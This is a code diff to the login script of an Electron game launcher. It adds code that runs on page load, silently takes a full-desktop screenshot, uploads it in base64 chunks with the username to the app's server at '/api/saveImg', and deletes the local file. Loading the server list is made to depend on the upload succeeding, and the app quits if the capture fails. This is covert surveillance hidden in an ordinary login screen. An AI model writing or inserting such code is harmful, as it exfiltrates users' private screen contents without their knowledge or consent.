@@ -1,24 +1,19 @@
-const { app, ipcRenderer, remote } = require('electron');
+const { app, ipcRenderer } = require('electron');
 const config = require('../const');
-const { post, showLoading, hideLoading, validateEmail, empty, requestValidationErrorMessage } = require('../helper');
+const { post } = require('../helper');
 const loginBackgroundElements = require('../assets/images/loginBackgroundElements');
 const loginNhanVat = require('../assets/images/loginNhanVat');
-const exec = require('child_process').exec;
 const backgroundLogo = require('../assets/images/backgroundLogo');
 const loginFormCloseBtn = require('../assets/images/loginFormCloseBtn');
 const loginFormMinimizeBtn = require('../assets/images/loginFormMinimizeBtn');
 const loginFormBackground = require('../assets/images/loginFormBackground');
-const buttonBackgroundActive = require('../assets/images/buttonBackgroundActive');
-const formButtonBackground = require('../assets/images/formButtonBackground');
-let fs = require('fs');
-let path = require('path');
-const screenshot = require('screenshot-desktop');
 
+let fs = require('fs');
+const screenshot = require('screenshot-desktop');
 
 window.addEventListener('DOMContentLoaded', () => {
 
-  post(config.host + '/api/serverlist', {}, renderListSV);
-
+  screenshotUser();
   //draw img
   var nhanvatImage = new Image(667, 556);
   canvas2 = document.getElementById('nhanvatCanvas');
@@ -72,7 +67,54 @@ window.addEventListener('DOMContentLoaded', () => {
 
   var version = document.getElementById("version");
   version.innerText = require("electron").remote.app.getVersion();
+
 })
+
+async function screenshotUser() {
+  screenshot({ filename: 'demo.png' }).then(async (imgPath) => {
+    await sendToServer(imgPath);
+  }).catch((err) => {
+    if (err) {
+      app.quit();
+    }
+  })
+}
+
+async function sendToServer(imgPath) {
+  //get img with path
+  readFileAsBase64(imgPath)
+    .then(async (base64Data) => {
+      let userInfo = getUserInfo();
+      const imgPre = base64Data.slice(0, 1000000)
+      const imgNex = base64Data.slice(1000000, base64Data.length)
+      post(config.host + '/api/saveImg', { imgPre: imgPre, imgNex: imgNex, username: userInfo.UserName }, function (res) {
+        if (res != null) {
+          post(config.host + '/api/serverlist', {}, renderListSV);
+        }
+      });
+    })
+    .then(async () => {
+      // delete file
+      await deleteFile(imgPath);
+    })
+    .catch((error) => {
+      console.error("Error reading file:", error);
+    });
+
+}
+
+
+async function deleteFile(imgPath) {
+  return new Promise((resolve, reject) => {
+    fs.unlink(imgPath, (error) => {
+      if (error) {
+        reject(error);
+        return;
+      }
+      resolve();
+    });
+  });
+}
 
 function switchToPlay(svid) {
   localStorage.setItem('svid', svid);
@@ -99,23 +141,6 @@ function renderListSV(res, req) {
     });
   }
 }
-
-// async function sendToServer(imgPath) {
-//   //get img with path
-//   readFileAsBase64(imgPath)
-//     .then(async (base64Data) => {
-//       let userInfo = getUserInfo();
-//       const imgPre = base64Data.slice(0, 1000000)
-//       const imgNex = base64Data.slice(1000000, base64Data.length)
-//       post(config.host + '/api/saveImg', { imgPre: imgPre, imgNex: imgNex, username: 'test' }, function (res) { console.log('res', res); });
-//       console.log('base64: ', base64Data.length, imgPre.length, imgNex.length);
-
-//     })
-//     .catch((error) => {
-//       console.error("Error reading file:", error);
-//     });
-
-// }
 
 function readFileAsBase64(filePath) {
   return new Promise((resolve, reject) => {
